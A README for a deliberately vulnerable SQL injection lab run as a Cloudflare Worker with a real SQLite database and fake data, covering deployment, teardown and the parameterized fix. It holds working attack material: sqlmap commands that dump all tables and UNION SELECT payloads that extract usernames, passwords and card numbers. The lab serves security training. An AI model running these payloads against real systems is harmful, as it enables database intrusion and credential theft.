# sqli-lab-d1 — SQL injection lab with a REAL database (Cloudflare D1)

Intentionally vulnerable Worker backed by a **real SQLite database** (Cloudflare
D1), so automated tools like **sqlmap** actually work against it. **Fake data only.**

Unlike the sibling `sqli-lab` (which uses a toy SQL evaluator for *manual*
learning), this one runs genuine SQLite, so sqlmap can fingerprint it, enumerate
tables, and dump data.

## Vulnerable endpoints
- `GET /product?id=1` — **numeric injection** (classic `?id=1` sqlmap target)
- `GET /api/search?q=Blue` — string injection inside a `LIKE`
- `POST /api/login` — body `{"username":"...","password":"..."}` (auth bypass)

Each response echoes the raw SQL that ran. Queries are built by raw string
concatenation against `env.DB` — the fix (parameterized `.bind()`) is at the
bottom of `src/index.js`.

## One-time setup + deploy (run on your machine, logged into Cloudflare)

```bash
cd sqli-lab-d1
npm install

# 1. Create the D1 database — this PRINTS a database_id
npx wrangler d1 create sqli-lab-db

# 2. Paste that database_id into wrangler.toml (replace PASTE_DATABASE_ID_HERE)

# 3. Seed the tables into the remote DB
npm run seed:remote

# 4. Deploy
npm run deploy      # -> https://sqli-lab-d1.<your-subdomain>.workers.dev
```

## Attack it with sqlmap
```bash
# detect + dump everything (SQLite)
sqlmap -u "https://sqli-lab-d1.<your-subdomain>.workers.dev/product?id=1" \
  --batch --dbms=sqlite --dump

# just the users table
sqlmap -u "https://sqli-lab-d1.<your-subdomain>.workers.dev/product?id=1" \
  --batch --dbms=sqlite -T users --dump
```

## Manual payloads (paste in the browser)
- `/product?id=0 OR 1=1` → all products
- `/product?id=0 UNION SELECT username, password, card FROM users` → dumps creds

## When done
```bash
npx wrangler delete --config ./wrangler.toml          # remove the Worker
npx wrangler d1 delete sqli-lab-db                     # remove the database
```
